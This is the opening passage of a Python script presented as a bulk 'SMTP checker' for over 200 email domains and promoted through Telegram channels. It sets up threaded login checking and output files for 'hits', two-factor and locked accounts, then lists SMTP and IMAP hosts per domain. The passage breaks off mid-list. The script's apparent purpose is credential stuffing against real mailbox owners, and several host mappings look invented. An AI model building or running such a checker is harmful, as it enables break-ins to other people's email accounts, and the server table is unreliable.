#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Smtp checker +200 domain

Telegram: 
      https://t.me/Murphython
      https://t.me/+sz0r3wI5y6cwMjg0
      https://t.me/+00Uzen6uu10zYTZk
      https://t.me/+zZUKD1RHroA5ODc8
      https://t.me/+Moplh1_mjS8xNjBh
"""

import os
import sys
import time
import socket
import smtplib
import imaplib
import ssl
import threading
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.align import Align

init(autoreset=True)
console = Console()

# ==================== CONFIGURATION ====================
RESULTS_DIR = "results"
os.makedirs(RESULTS_DIR, exist_ok=True)
DATE_DIR = time.strftime("%Y-%m-%d_%H-%M-%S")
OUTPUT_DIR = os.path.join(RESULTS_DIR, DATE_DIR)
os.makedirs(OUTPUT_DIR, exist_ok=True)

SMTP_HITS_FILE = os.path.join(OUTPUT_DIR, "Smtps-Hits.txt")
VALID_NO_SMTP_FILE = os.path.join(OUTPUT_DIR, "Valid-not-found.txt")
TWOFA_FILE = os.path.join(OUTPUT_DIR, "2fa.txt")
LOCKED_FILE = os.path.join(OUTPUT_DIR, "locked.txt")

stats = {"total": 0, "checked": 0, "hit": 0, "valid": 0, "twofa": 0, "locked": 0, "bad": 0, "start_time": 0}
stats_lock = threading.Lock()
hit_counter = 0
recent_activities = []

from cfonts import render

Smtp_logo = render('SMTP', 
                   colors=['cyan', 'blue'], 
                   align='center', 
                   font='block')

#print(Smtp_logo)
# ==================== COMPLETE SMTP SERVERS ====================
SMTP_SERVERS = {
    'gmail.com': ('smtp.gmail.com', [587, 465]),
    'googlemail.com': ('smtp.gmail.com', [587, 465]),
    'google.com': ('smtp.gmail.com', [587, 465]),
    'outlook.com': ('smtp.office365.com', [587, 465]),
    'hotmail.com': ('smtp.office365.com', [587, 465]),
    'live.com': ('smtp.office365.com', [587, 465]),
    'msn.com': ('smtp.office365.com', [587, 465]),
    'windowslive.com': ('smtp.office365.com', [587, 465]),
    'passport.com': ('smtp.office365.com', [587, 465]),
    'yahoo.com': ('smtp.mail.yahoo.com', [465, 587]),
    'ymail.com': ('smtp.mail.yahoo.com', [465, 587]),
    'rocketmail.com': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.uk': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.in': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.ca': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.au': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.de': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.fr': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.es': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.it': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.jp': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.kr': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.mx': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.br': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.ar': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.tw': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.hk': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.sg': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.com.ph': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.id': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.th': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.za': ('smtp.mail.yahoo.com', [465, 587]),
    'yahoo.co.nz': ('smtp.mail.yahoo.com', [465, 587]),
    'aol.com': ('smtp.aol.com', [587, 465]),
    'aim.com': ('smtp.aol.com', [587, 465]),
    'aol.co.uk': ('smtp.aol.com', [587, 465]),
    'aol.de': ('smtp.aol.com', [587, 465]),
    'aol.fr': ('smtp.aol.com', [587, 465]),
    'aol.it': ('smtp.aol.com', [587, 465]),
    'aol.es': ('smtp.aol.com', [587, 465]),
    'aol.com.au': ('smtp.aol.com', [587, 465]),
    'aol.ca': ('smtp.aol.com', [587, 465]),
    'icloud.com': ('smtp.mail.me.com', [587, 465]),
    'me.com': ('smtp.mail.me.com', [587, 465]),
    'mac.com': ('smtp.mail.me.com', [587, 465]),
    'mail.com': ('smtp.mail.com', [587, 465]),
    'email.com': ('smtp.mail.com', [587, 465]),
    'usa.com': ('smtp.mail.com', [587, 465]),
    'myself.com': ('smtp.mail.com', [587, 465]),
    'post.com': ('smtp.mail.com', [587, 465]),
    'europe.com': ('smtp.mail.com', [587, 465]),
    'asia.com': ('smtp.mail.com', [587, 465]),
    'iname.com': ('smtp.mail.com', [587, 465]),
    'writeme.com': ('smtp.mail.com', [587, 465]),
    'dr.com': ('smtp.mail.com', [587, 465]),
    'consultant.com': ('smtp.mail.com', [587, 465]),
    'accountant.com': ('smtp.mail.com', [587, 465]),
    'engineer.com': ('smtp.mail.com', [587, 465]),
    'chef.net': ('smtp.mail.com', [587, 465]),
    'techie.com': ('smtp.mail.com', [587, 465]),
    'linuxmail.org': ('smtp.mail.com', [587, 465]),
    'zoho.com': ('smtp.zoho.com', [587, 465]),
    'zohomail.com': ('smtp.zoho.com', [587, 465]),
    'zohocorp.com': ('smtp.zoho.com', [587, 465]),
    'yandex.com': ('smtp.yandex.com', [465, 587]),
    'yandex.ru': ('smtp.yandex.com', [465, 587]),
    'yandex.ua': ('smtp.yandex.com', [465, 587]),
    'yandex.by': ('smtp.yandex.com', [465, 587]),
    'yandex.kz': ('smtp.yandex.com', [465, 587]),
    'yandex.com.tr': ('smtp.yandex.com', [465, 587]),
    'ya.ru': ('smtp.yandex.com', [465, 587]),
    'mail.ru': ('smtp.mail.ru', [465, 587]),
    'bk.ru': ('smtp.mail.ru', [465, 587]),
    'list.ru': ('smtp.mail.ru', [465, 587]),
    'inbox.ru': ('smtp.mail.ru', [465, 587]),
    'internet.ru': ('smtp.mail.ru', [465, 587]),
    'gmx.com': ('smtp.gmx.com', [587, 465]),
    'gmx.net': ('smtp.gmx.com', [587, 465]),
    'gmx.de': ('smtp.gmx.com', [587, 465]),
    'gmx.at': ('smtp.gmx.com', [587, 465]),
    'gmx.ch': ('smtp.gmx.com', [587, 465]),
    'gmx.fr': ('smtp.gmx.com', [587, 465]),
    'gmx.es': ('smtp.gmx.com', [587, 465]),
    'gmx.it': ('smtp.gmx.com', [587, 465]),
    'gmx.co.uk': ('smtp.gmx.com', [587, 465]),
    'gmx.us': ('smtp.gmx.com', [587, 465]),
    'web.de': ('smtp.web.de', [587, 465]),
    'orange.fr': ('smtp.orange.fr', [587, 465]),
    'wanadoo.fr': ('smtp.orange.fr', [587, 465]),
    'orange.net': ('smtp.orange.fr', [587, 465]),
    'orange.com': ('smtp.orange.fr', [587, 465]),
    'orange.co.uk': ('smtp.orange.fr', [587, 465]),
    'orange.es': ('smtp.orange.es', [587, 465]),
    'orange.pl': ('smtp.orange.pl', [587, 465]),
    'orange.ro': ('smtp.orange.ro', [587, 465]),
    'orange.be': ('smtp.orange.be', [587, 465]),
    'free.fr': ('smtp.free.fr', [587, 465]),
    'sfr.fr': ('smtp.sfr.fr', [587, 465]),
    'neuf.fr': ('smtp.sfr.fr', [587, 465]),
    'cegetel.net': ('smtp.sfr.fr', [587, 465]),
    'laposte.net': ('smtp.laposte.net', [587, 465]),
    'libero.it': ('smtp.libero.it', [587, 465]),
    'virgilio.it': ('smtp.virgilio.it', [587, 465]),
    'iol.it': ('smtp.libero.it', [587, 465]),
    'alice.it': ('smtp.alice.it', [587, 465]),
    'tiscali.it': ('smtp.tiscali.it', [587, 465]),
    'tin.it': ('smtp.tin.it', [587, 465]),
    'telecomitalia.it': ('smtp.telecomitalia.it', [587, 465]),
    'tim.it': ('smtp.tim.it', [587, 465]),
    'naver.com': ('smtp.naver.com', [587, 465]),
    'daum.net': ('smtp.daum.net', [587, 465]),
    'nate.com': ('smtp.nate.com', [587, 465]),
    'hanmail.net': ('smtp.hanmail.net', [587, 465]),
    'kakao.com': ('smtp.kakao.com', [587, 465]),
    'korea.com': ('smtp.korea.com', [587, 465]),
    'paran.com': ('smtp.paran.com', [587, 465]),
    'empas.com': ('smtp.empas.com', [587, 465]),
    'qq.com': ('smtp.qq.com', [587, 465]),
    'foxmail.com': ('smtp.foxmail.com', [587, 465]),
    '163.com': ('smtp.163.com', [587, 465]),
    '126.com': ('smtp.126.com', [587, 465]),
    'sina.com': ('smtp.sina.com', [587, 465]),
    'sina.cn': ('smtp.sina.cn', [587, 465]),
    'sohu.com': ('smtp.sohu.com', [587, 465]),
    'yeah.net': ('smtp.yeah.net', [587, 465]),
    'tom.com': ('smtp.tom.com', [587, 465]),
    '21cn.com': ('smtp.21cn.com', [587, 465]),
    '189.cn': ('smtp.189.cn', [587, 465]),
    '139.com': ('smtp.139.com', [587, 465]),
    'wo.cn': ('smtp.wo.cn', [587, 465]),
    '10086.cn': ('smtp.10086.cn', [587, 465]),
    'china.com': ('smtp.china.com', [587, 465]),
    'china.net.cn': ('smtp.china.net.cn', [587, 465]),
    'docomo.ne.jp': ('smtp.docomo.ne.jp', [587, 465]),
    'softbank.ne.jp': ('smtp.softbank.ne.jp', [587, 465]),
    'i.softbank.jp': ('smtp.softbank.ne.jp', [587, 465]),
    'ezweb.ne.jp': ('smtp.ezweb.ne.jp', [587, 465]),
    'au.com': ('smtp.au.com', [587, 465]),
    'au-one.net': ('smtp.au-one.net', [587, 465]),
    'dokomo.ne.jp': ('smtp.dokomo.ne.jp', [587, 465]),
    'uol.com.br': ('smtp.uol.com.br', [587, 465]),
    'bol.com.br': ('smtp.bol.com.br', [587, 465]),
    'ig.com.br': ('smtp.ig.com.br', [587, 465]),
    'r7.com': ('smtp.r7.com', [587, 465]),
    'globo.com': ('smtp.globo.com', [587, 465]),
    'oi.com.br': ('smtp.oi.com.br', [587, 465]),
    'terra.com.br': ('smtp.terra.com.br', [587, 465]),
    'pop.com.br': ('smtp.pop.com.br', [587, 465]),
    'zipmail.com.br': ('smtp.zipmail.com.br', [587, 465]),
    'seznam.cz': ('smtp.seznam.cz', [587, 465]),
    'centrum.cz': ('smtp.centrum.cz', [587, 465]),
    'atlas.cz': ('smtp.atlas.cz', [587, 465]),
    'volny.cz': ('smtp.volny.cz', [587, 465]),
    'post.cz': ('smtp.post.cz', [587, 465]),
    'azet.sk': ('smtp.azet.sk', [587, 465]),
    'zoznam.sk': ('smtp.zoznam.sk', [587, 465]),
    'posta.sk': ('smtp.posta.sk', [587, 465]),
    'onet.pl': ('smtp.onet.pl', [587, 465]),
    'wp.pl': ('smtp.wp.pl', [587, 465]),
    'o2.pl': ('smtp.o2.pl', [587, 465]),
    'interia.pl': ('smtp.interia.pl', [587, 465]),
    'poczta.onet.pl': ('smtp.poczta.onet.pl', [587, 465]),
    'tlen.pl': ('smtp.tlen.pl', [587, 465]),
    'gazeta.pl': ('smtp.gazeta.pl', [587, 465]),
    'go2.pl': ('smtp.go2.pl', [587, 465]),
    'op.pl': ('smtp.op.pl', [587, 465]),
    'abv.bg': ('smtp.abv.bg', [587, 465]),
    'mail.bg': ('smtp.mail.bg', [587, 465]),
    'dir.bg': ('smtp.dir.bg', [587, 465]),
    'bgnet.bg': ('smtp.bgnet.bg', [587, 465]),
    'yahoo.ro': ('smtp.mail.yahoo.com', [465, 587]),
    'rdsmail.ro': ('smtp.rdsmail.ro', [587, 465]),
    'clicknet.ro': ('smtp.clicknet.ro', [587, 465]),
    'click.ro': ('smtp.click.ro', [587, 465]),
    'gmail.ro': ('smtp.gmail.com', [587, 465]),
    'freemail.hu': ('smtp.freemail.hu', [587, 465]),
    'citromail.hu': ('smtp.citromail.hu', [587, 465]),
    'upcmail.hu': ('smtp.upcmail.hu', [587, 465]),
    'vipmail.hu': ('smtp.vipmail.hu', [587, 465]),
    'otenet.gr': ('smtp.otenet.gr', [587, 465]),
    'forthnet.gr': ('smtp.forthnet.gr', [587, 465]),
    'hol.gr': ('smtp.hol.gr', [587, 465]),
    'gmail.gr': ('smtp.gmail.com', [587, 465]),
    'ttmail.com': ('smtp.ttmail.com', [587, 465]),
    'ttnet.com.tr': ('smtp.ttnet.com.tr', [587, 465]),
    'superonline.com': ('smtp.superonline.com', [587, 465]),
    'turk.net': ('smtp.turk.net', [587, 465]),
    'mynet.com': ('smtp.mynet.com', [587, 465]),
    'koc.net': ('smtp.koc.net', [587, 465]),
    'kpnmail.nl': ('smtp.kpnmail.nl', [587, 465]),
    'ziggo.nl': ('smtp.ziggo.nl', [587, 465]),
    'planet.nl': ('smtp.planet.nl', [587, 465]),
    'chello.nl': ('smtp.chello.nl', [587, 465]),
    'hetnet.nl': ('smtp.hetnet.nl', [587, 465]),
    'upcmail.nl': ('smtp.upcmail.nl', [587, 465]),
    'skynet.be': ('smtp.skynet.be', [587, 465]),
    'telenet.be': ('smtp.telenet.be', [587, 465]),
    'proximus.be': ('smtp.proximus.be', [587, 465]),
    'bluewin.ch': ('smtp.bluewin.ch', [587, 465]),
    'swissonline.ch': ('smtp.swissonline.ch', [587, 465]),
    'sunrise.ch': ('smtp.sunrise.ch', [587, 465]),
    'spray.se': ('smtp.spray.se', [587, 465]),
    'comhem.se': ('smtp.comhem.se', [587, 465]),
    'bredband.net': ('smtp.bredband.net', [587, 465]),
    'telia.com': ('smtp.telia.com', [587, 465]),
    'online.no': ('smtp.online.no', [587, 465]),
    'start.no': ('smtp.start.no', [587, 465]),
    'broadpark.no': ('smtp.broadpark.no', [587, 465]),
    'getmail.no': ('smtp.getmail.no', [587, 465]),
    'mail.dk': ('smtp.mail.dk', [587, 465]),
    'stofanet.dk': ('smtp.stofanet.dk', [587, 465]),
    'adsl.dk': ('smtp.adsl.dk', [587, 465]),
    'suomi24.fi': ('smtp.suomi24.fi', [587, 465]),
    'kolumbus.fi': ('smtp.kolumbus.fi', [587, 465]),
    'saunalahti.fi': ('smtp.saunalahti.fi', [587, 465]),
    'walla.co.il': ('smtp.walla.co.il', [587, 465]),
    '012.net.il': ('smtp.012.net.il', [587, 465]),
    'bezeqint.net': ('smtp.bezeqint.net', [587, 465]),
    'netvision.net.il': ('smtp.netvision.net.il', [587, 465]),
    'etisalat.ae': ('smtp.etisalat.ae', [587, 465]),
    'du.ae': ('smtp.du.ae', [587, 465]),
    'emirates.net.ae': ('smtp.emirates.net.ae', [587, 465]),
    'stc.com.sa': ('smtp.stc.com.sa', [587, 465]),
    'mobily.com.sa': ('smtp.mobily.com.sa', [587, 465]),
    'zain.com': ('smtp.zain.com', [587, 465]),
    'rediffmail.com': ('smtp.rediffmail.com', [587, 465]),
    'indiatimes.com': ('smtp.indiatimes.com', [587, 465]),
    'sify.com': ('smtp.sify.com', [587, 465]),
    'vsnl.com': ('smtp.vsnl.com', [587, 465]),
    'airtelmail.com': ('smtp.airtelmail.com', [587, 465]),
    'airtel.in': ('smtp.airtel.in', [587, 465]),
    'jio.com': ('smtp.jio.com', [587, 465]),
    'jio.in': ('smtp.jio.in', [587, 465]),
    'tatatel.in': ('smtp.tatatel.in', [587, 465]),
    'yahoo.com.pk': ('smtp.mail.yahoo.com', [465, 587]),
    'hotmail.com.pk': ('smtp.office365.com', [587, 465]),
    'yahoo.com.bd': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.com.bd': ('smtp.gmail.com', [587, 465]),
    'yahoo.lk': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.lk': ('smtp.gmail.com', [587, 465]),
    'yahoo.com.np': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.com.np': ('smtp.gmail.com', [587, 465]),
    'bigpond.com': ('smtp.bigpond.com', [587, 465]),
    'bigpond.net.au': ('smtp.bigpond.com', [587, 465]),
    'optusnet.com.au': ('smtp.optusnet.com.au', [587, 465]),
    'iinet.net.au': ('smtp.iinet.net.au', [587, 465]),
    'telstra.com': ('smtp.telstra.com', [587, 465]),
    'tpg.com.au': ('smtp.tpg.com.au', [587, 465]),
    'xtra.co.nz': ('smtp.xtra.co.nz', [587, 465]),
    'vodafone.co.nz': ('smtp.vodafone.co.nz', [587, 465]),
    'spark.co.nz': ('smtp.spark.co.nz', [587, 465]),
    'orcon.net.nz': ('smtp.orcon.net.nz', [587, 465]),
    'bell.net': ('smtp.bell.net', [587, 465]),
    'rogers.com': ('smtp.rogers.com', [587, 465]),
    'sympatico.ca': ('smtp.sympatico.ca', [587, 465]),
    'telus.net': ('smtp.telus.net', [587, 465]),
    'shaw.ca': ('smtp.shaw.ca', [587, 465]),
    'videotron.ca': ('smtp.videotron.ca', [587, 465]),
    'webmail.co.za': ('smtp.webmail.co.za', [587, 465]),
    'vodamail.co.za': ('smtp.vodamail.co.za', [587, 465]),
    'mtnloaded.co.za': ('smtp.mtnloaded.co.za', [587, 465]),
    'telkomsa.net': ('smtp.telkomsa.net', [587, 465]),
    'yahoo.com.eg': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.com.eg': ('smtp.gmail.com', [587, 465]),
    'link.net.eg': ('smtp.link.net.eg', [587, 465]),
    'yahoo.co.ma': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.co.ma': ('smtp.gmail.com', [587, 465]),
    'yahoo.com.tn': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.com.tn': ('smtp.gmail.com', [587, 465]),
    'yahoo.dz': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.dz': ('smtp.gmail.com', [587, 465]),
    'yahoo.com.ng': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.com.ng': ('smtp.gmail.com', [587, 465]),
    'yahoo.co.ke': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.co.ke': ('smtp.gmail.com', [587, 465]),
    'yahoo.com.gh': ('smtp.mail.yahoo.com', [465, 587]),
    'gmail.com.gh': ('smtp.gmail.com', [587, 465]),
    'protonmail.com': ('smtp.protonmail.ch', [587, 465]),
    'proton.me': ('smtp.protonmail.ch', [587, 465]),
    'tutanota.com': ('smtp.tutanota.com', [587, 465]),
    'tuta.io': ('smtp.tutanota.com', [587, 465]),
    'startmail.com': ('smtp.startmail.com', [587, 465]),
    'fastmail.com': ('smtp.fastmail.com', [587, 465]),
    'runbox.com': ('smtp.runbox.com', [587, 465]),
    'mailfence.com': ('smtp.mailfence.com', [587, 465]),
    'countermail.com': ('smtp.countermail.com', [587, 465]),
    'posteo.de': ('smtp.posteo.de', [587, 465]),
    'kolabnow.com': ('smtp.kolabnow.com', [587, 465]),
    'mailbox.org': ('smtp.mailbox.org', [587, 465]),
    'ctemplar.com': ('smtp.ctemplar.com', [587, 465]),
    'disroot.org': ('smtp.disroot.org', [587, 465]),
    'company.com': ('smtp.gmail.com', [587, 465]),
    'corp.com': ('smtp.gmail.com', [587, 465]),
}

# ==================== IMAP SERVERS ====================
IMAP_SERVERS = {
    'gmail.com': ('imap.gmail.com', 993),
    'googlemail.com': ('imap.gmail.com', 993),
    'google.com': ('imap.gmail.com', 993),
    'outlook.com': ('outlook.office365.com', 993),
    'hotmail.com': ('outlook.office365.com', 993),
    'live.com': ('outlook.office365.com', 993),
    'msn.com': ('outlook.office365.com', 993),
    'windowslive.com': ('outlook.office365.com', 993),
    'passport.com': ('outlook.office365.com', 993),
    't-online.de': ('imap.t-online.de', 993),
    'ymail.com': ('imap.mail.yahoo.com', 993),
    'rocketmail.com': ('imap.mail.yahoo.com', 993),
    'yahoo.co.uk': ('imap.mail.yahoo.com', 993),
    'yahoo.co.in': ('imap.mail.yahoo.com', 993),
    'yahoo.ca': ('imap.mail.yahoo.com', 993),
    'yahoo.com.au': ('imap.mail.yahoo.com', 993),
    'yahoo.de': ('imap.mail.yahoo.com', 993),
    'yahoo.fr': ('imap.mail.yahoo.com', 993),
    'yahoo.es': ('imap.mail.yahoo.com', 993),
    'yahoo.it': ('imap.mail.yahoo.com', 993),
    'yahoo.co.jp': ('imap.mail.yahoo.com', 993),
    'yahoo.co.kr': ('imap.mail.yahoo.com', 993),
    'yahoo.com.mx': ('imap.mail.yahoo.com', 993),
    'yahoo.com.br': ('imap.mail.yahoo.com', 993),
    'yahoo.com.ar': ('imap.mail.yahoo.com', 993),
    'yahoo.com.tw': ('imap.mail.yahoo.com', 993),
    'yahoo.com.hk': ('imap.mail.yahoo.com', 993),
    'yahoo.com.sg': ('imap.mail.yahoo.com', 993),
    'yahoo.com.ph': ('imap.mail.yahoo.com', 993),
    'yahoo.co.id': ('imap.mail.yahoo.com', 993),
    'yahoo.co.th': ('imap.mail.yahoo.com', 993),
    'yahoo.co.za': ('imap.mail.yahoo.com', 993),
    'yahoo.co.nz': ('imap.mail.yahoo.com', 993),
    'aol.com': ('imap.aol.com', 993),
    'aim.com': ('imap.aol.com', 993),
    'aol.co.uk': ('imap.aol.com', 993),
    'aol.de': ('imap.aol.com', 993),
    'aol.fr': ('imap.aol.com', 993),
    'aol.it': ('imap.aol.com', 993),
    'aol.es': ('imap.aol.com', 993),
    'aol.com.au': ('imap.aol.com', 993),
    'aol.ca': ('imap.aol.com', 993),
    'icloud.com': ('imap.mail.me.com', 993),
    'me.com': ('imap.mail.me.com', 993),
    'mac.com': ('imap.mail.me.com', 993),
    'mail.com': ('imap.mail.com', 993),
    'email.com': ('imap.mail.com', 993),
    'usa.com': ('imap.mail.com', 993),
    'myself.com': ('imap.mail.com', 993),
    'post.com': ('imap.mail.com', 993),
    'europe.com': ('imap.mail.com', 993),
    'asia.com': ('imap.mail.com', 993),
    'iname.com': ('imap.mail.com', 993),
    'writeme.com': ('imap.mail.com', 993),
    'dr.com': ('imap.mail.com', 993),
    'consultant.com': ('imap.mail.com', 993),
    'accountant.com': ('imap.mail.com', 993),
    'engineer.com': ('imap.mail.com', 993),
    'chef.net': ('imap.mail.com', 993),
    'techie.com': ('imap.mail.com', 993),
    'linuxmail.org': ('imap.mail.com', 993),
    'zoho.com': ('imap.zoho.com', 993),
    'zohomail.com': ('imap.zoho.com', 993),
    'zohocorp.com': ('imap.zoho.com', 993),
    'yandex.com': ('imap.yandex.com', 993),
    'yandex.ru': ('imap.yandex.com', 993),
    'yandex.ua': ('imap.yandex.com', 993),
    'yandex.by': ('imap.yandex.com', 993),
    'yandex.kz': ('imap.yandex.com', 993),
    'yandex.com.tr': ('imap.yandex.com', 993),
    'ya.ru': ('imap.yandex.com', 993),
    'mail.ru': ('imap.mail.ru', 993),
    'bk.ru': ('imap.mail.ru', 993),
    'list.ru': ('imap.mail.ru', 993),
    'inbox.ru': ('imap.mail.ru', 993),
    'internet.ru': ('imap.mail.ru', 993),
    'gmx.com': ('imap.gmx.com', 993),
    'gmx.net': ('imap.gmx.com', 993),
    'gmx.de': ('imap.gmx.com', 993),
    'gmx.at': ('imap.gmx.com', 993),
    'gmx.ch': ('imap.gmx.com', 993),
    'gmx.fr': ('imap.gmx.com', 993),
    'gmx.es': ('imap.gmx.com', 993),
    'gmx.it': ('imap.gmx.com', 993),
    'gmx.co.uk': ('imap.gmx.com', 993),
    'gmx.us': ('imap.gmx.com', 993),
    'web.de': ('imap.web.de', 993),
    'orange.fr': ('imap.orange.fr', 993),
    'wanadoo.fr': ('imap.orange.fr', 993),
    'orange.net': ('imap.orange.fr', 993),
    'orange.com': ('imap.orange.fr', 993),
    'orange.co.uk': ('imap.orange.fr', 993),
    'orange.es': ('imap.orange.es', 993),
    'orange.pl': ('imap.orange.pl', 993),
    'orange.ro': ('imap.orange.ro', 993),
    'orange.be': ('imap.orange.be', 993),
    'free.fr': ('imap.free.fr', 993),
    'sfr.fr': ('imap.sfr.fr', 993),
    'neuf.fr': ('imap.sfr.fr', 993),
    'cegetel.net': ('imap.sfr.fr', 993),
    'laposte.net': ('imap.laposte.net', 993),
    'libero.it': ('imap.libero.it', 993),
    'virgilio.it': ('imap.virgilio.it', 993),
    'iol.it': ('imap.libero.it', 993),
    'alice.it': ('imap.alice.it', 993),
    'tiscali.it': ('imap.tiscali.it', 993),
    'tin.it': ('imap.tin.it', 993),
    'telecomitalia.it': ('imap.telecomitalia.it', 993),
    'tim.it': ('imap.tim.it', 993),
    'naver.com': ('imap.naver.com', 993),
    'daum.net': ('imap.daum.net', 993),
    'nate.com': ('imap.nate.com', 993),
    'hanmail.net': ('imap.hanmail.net', 993),
    'kakao.com': ('imap.kakao.com', 993),
    'korea.com': ('imap.korea.com', 993),
    'paran.com': ('imap.paran.com', 993),
    'empas.com': ('imap.empas.com', 993),
    'qq.com': ('imap.qq.com', 993),
    'foxmail.com': ('imap.foxmail.com', 993),
    '163.com': ('imap.163.com', 993),
    '126.com': ('imap.126.com', 993),
    'sina.com': ('imap.sina.com', 993),
    'sina.cn': ('imap.sina.cn', 993),
    'sohu.com': ('imap.sohu.com', 993),
    'yeah.net': ('imap.yeah.net', 993),
    'tom.com': ('imap.tom.com', 993),
    '21cn.com': ('imap.21cn.com', 993),
    '189.cn': ('imap.189.cn', 993),
    '139.com': ('imap.139.com', 993),
    'wo.cn': ('imap.wo.cn', 993),
    '10086.cn': ('imap.10086.cn', 993),
    'china.com': ('imap.china.com', 993),
    'china.net.cn': ('imap.china.net.cn', 993),
    'docomo.ne.jp': ('imap.docomo.ne.jp', 993),
    'softbank.ne.jp': ('imap.softbank.ne.jp', 993),
    'i.softbank.jp': ('imap.softbank.ne.jp', 993),
    'ezweb.ne.jp': ('imap.ezweb.ne.jp', 993),
    'au.com': ('imap.au.com', 993),
    'au-one.net': ('imap.au-one.net', 993),
    'dokomo.ne.jp': ('imap.dokomo.ne.jp', 993),
    'uol.com.br': ('imap.uol.com.br', 993),
    'bol.com.br': ('imap.bol.com.br', 993),
    'ig.com.br': ('imap.ig.com.br', 993),
    'r7.com': ('imap.r7.com', 993),
    'globo.com': ('imap.globo.com', 993),
    'oi.com.br': ('imap.oi.com.br', 993),
    'terra.com.br': ('imap.terra.com.br', 993),
    'pop.com.br': ('imap.pop.com.br', 993),
    'zipmail.com.br': ('imap.zipmail.com.br', 993),
    'seznam.cz': ('imap.seznam.cz', 993),
    'centrum.cz': ('imap.centrum.cz', 993),
    'atlas.cz': ('imap.atlas.cz', 993),
    'volny.cz': ('imap.volny.cz', 993),
    'post.cz': ('imap.post.cz', 993),
    'azet.sk': ('imap.azet.sk', 993),
    'zoznam.sk': ('imap.zoznam.sk', 993),
    'posta.sk': ('imap.posta.sk', 993),
    'onet.pl': ('imap.onet.pl', 993),
    'wp.pl': ('imap.wp.pl', 993),
    'o2.pl': ('imap.o2.pl', 993),
    'interia.pl': ('imap.interia.pl', 993),
    'poczta.onet.pl': ('imap.poczta.onet.pl', 993),
    'tlen.pl': ('imap.tlen.pl', 993),
    'gazeta.pl': ('imap.gazeta.pl', 993),
    'go2.pl': ('imap.go2.pl', 993),
    'op.pl': ('imap.op.pl', 993),
    'abv.bg': ('imap.abv.bg', 993),
    'mail.bg': ('imap.mail.bg', 993),
    'dir.bg': ('imap.dir.bg', 993),
    'bgnet.bg': ('imap.bgnet.bg', 993),
    'yahoo.ro': ('imap.mail.yahoo.com', 993),
    'rdsmail.ro': ('imap.rdsmail.ro', 993),
    'clicknet.ro': ('imap.clicknet.ro', 993),
    'click.ro': ('imap.click.ro', 993),
    'gmail.ro': ('imap.gmail.com', 993),
    'freemail.hu': ('imap.freemail.hu', 993),
    'citromail.hu': ('imap.citromail.hu', 993),
    'upcmail.hu': ('imap.upcmail.hu', 993),
    'vipmail.hu': ('imap.vipmail.hu', 993),
    'otenet.gr': ('imap.otenet.gr', 993),
    'forthnet.gr': ('imap.forthnet.gr', 993),
    'hol.gr': ('imap.hol.gr', 993),
    'gmail.gr': ('imap.gmail.com', 993),
    'ttmail.com': ('imap.ttmail.com', 993),
    'ttnet.com.tr': ('imap.ttnet.com.tr', 993),
    'superonline.com': ('imap.superonline.com', 993),
    'turk.net': ('imap.turk.net', 993),
    'mynet.com': ('imap.mynet.com', 993),
    'koc.net': ('imap.koc.net', 993),
    'kpnmail.nl': ('imap.kpnmail.nl', 993),
    'ziggo.nl': ('imap.ziggo.nl', 993),
    'planet.nl': ('imap.planet.nl', 993),
    'chello.nl': ('imap.chello.nl', 993),
    'hetnet.nl': ('imap.hetnet.nl', 993),
    'upcmail.nl': ('imap.upcmail.nl', 993),
    'skynet.be': ('imap.skynet.be', 993),
    'telenet.be': ('imap.telenet.be', 993),
    'proximus.be': ('imap.proximus.be', 993),
    'bluewin.ch': ('imap.bluewin.ch', 993),
    'swissonline.ch': ('imap.swissonline.ch', 993),
    'sunrise.ch': ('imap.sunrise.ch', 993),
    'spray.se': ('imap.spray.se', 993),
    'comhem.se': ('imap.comhem.se', 993),
    'bredband.net': ('imap.bredband.net', 993),
    'telia.com': ('imap.telia.com', 993),
    'online.no': ('imap.online.no', 993),
    'start.no': ('imap.start.no', 993),
    'broadpark.no': ('imap.broadpark.no', 993),
    'getmail.no': ('imap.getmail.no', 993),
    'mail.dk': ('imap.mail.dk', 993),
    'stofanet.dk': ('imap.stofanet.dk', 993),
    'adsl.dk': ('imap.adsl.dk', 993),
    'suomi24.fi': ('imap.suomi24.fi', 993),
    'kolumbus.fi': ('imap.kolumbus.fi', 993),
    'saunalahti.fi': ('imap.saunalahti.fi', 993),
    'walla.co.il': ('imap.walla.co.il', 993),
    '012.net.il': ('imap.012.net.il', 993),
    'bezeqint.net': ('imap.bezeqint.net', 993),
    'netvision.net.il': ('imap.netvision.net.il', 993),
    'etisalat.ae': ('imap.etisalat.ae', 993),
    'du.ae': ('imap.du.ae', 993),
    'emirates.net.ae': ('imap.emirates.net.ae', 993),
